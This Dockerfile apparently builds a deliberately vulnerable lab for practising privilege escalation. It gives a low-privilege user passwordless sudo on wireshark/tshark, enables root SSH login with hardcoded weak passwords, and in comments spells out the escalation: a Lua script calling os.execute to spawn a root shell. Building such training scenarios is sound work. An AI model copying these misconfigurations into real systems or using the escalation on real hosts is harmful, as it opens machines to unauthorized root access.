FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_wireshark
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/wireshark as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, wireshark (tshark CLI), and netcat for the exploit
# Wireshark's CLI tool (tshark) can be used; the "wireshark" binary in headless
# environments is effectively tshark. We install tshark and create the expected path.
# We also need netcat for the exploit trigger and xterm/xdg-utils won't be needed.
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        tshark \
        netcat-openbsd \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# tshark is installed as /usr/bin/tshark. The scenario references /usr/bin/wireshark.
# In CLI/headless environments, wireshark package provides dumpcap + tshark.
# Create a symlink so /usr/bin/wireshark points to tshark for the sudo rule.
# The actual GTKless exploit uses tshark's -z lua:script capability or dumpcap pipes.
# However, the real privilege escalation with wireshark/tshark via sudo is through
# the -z lua:script option which can execute arbitrary Lua code as root.
RUN ln -sf /usr/bin/tshark /usr/bin/wireshark

# Verify wireshark (tshark) is installed and accessible
RUN ls -la /usr/bin/wireshark && /usr/bin/wireshark --version

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# wireshark/tshark when run as root can execute arbitrary OS commands via:
#   1. Lua scripting: -X lua_script:/path/to/script.lua
#   2. Pipe interface with extcap
# Exploit: user writes a Lua script that calls os.execute() to spawn a root shell,
# then runs: sudo wireshark -X lua_script:/tmp/exploit.lua -c 0 -i lo
# The Lua script: os.execute("/bin/bash")
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/wireshark" > /etc/sudoers.d/wireshark && \
    chmod 440 /etc/sudoers.d/wireshark

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]